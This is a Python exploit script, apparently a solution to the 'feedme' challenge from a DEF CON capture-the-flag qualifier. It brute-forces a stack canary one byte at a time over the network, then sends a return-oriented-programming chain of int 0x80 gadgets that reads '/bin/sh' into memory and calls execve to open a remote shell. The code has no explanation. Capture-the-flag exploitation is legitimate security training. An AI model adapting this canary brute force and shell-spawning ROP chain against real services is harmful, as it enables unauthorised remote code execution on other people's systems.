from ch1mac import *
from pwn import SigreturnFrame


def main():
	#s = SockCon('10.211.55.4',1337)
	s = SockCon("feedme_47aa9b0d8ad186754acd4bece3d6a177.quals.shallweplayaga.me",4092)

	canary="\x00"
	int80 = 0x0806FA20
	read = 0x08048EAD
	pppr = 0x0809e515
	pedx = 0x0806f34a
	pecxebx = 0x0806f371

	for i in range(3):
		payload="A"*0x20
		payload+=canary
		for j in range(0xFF):
			PrintNum("%d : %d",i,j)
			s.send(chr(len(payload)+1))
			s.send(payload+chr(j))
			tmp = RD(s,"exit.\n",rd_num=1024)
			if 'YUM' in tmp:
				canary += chr(j)
				break
			if 'ATE' not in tmp:
				print tmp
				return
		print repr(canary)
	print repr(canary)



	payload = "A"*0x20
	payload += canary
	payload += "AAAA"*3
	payload += p(0x080bb496)
	payload += p(0x3)

	payload += p(pecxebx)
	payload += p(0x080EBF40)
	payload += p(0)


	payload += p(pedx)
	payload += p(0x18)

	payload += p(int80)

	payload += p(0x080bb496)
	payload += p(0xb)

	payload += p(pecxebx)
	payload += p(0x080EBF4C)
	payload += p(0x080EBF40)

	payload += p(pedx)
	payload += p(0x080EBF50)

	payload += p(int80)

	s.send(chr(len(payload)))
	s.send(payload)
	s.send("/bin/sh\x00"+p(0)+p(0x080EBF40)+p(0)+p(0))

	GiveMeShell(s)

if __name__ == '__main__':
	while True:
		try:
			main()
		except Exception as e:
			print e
			pass
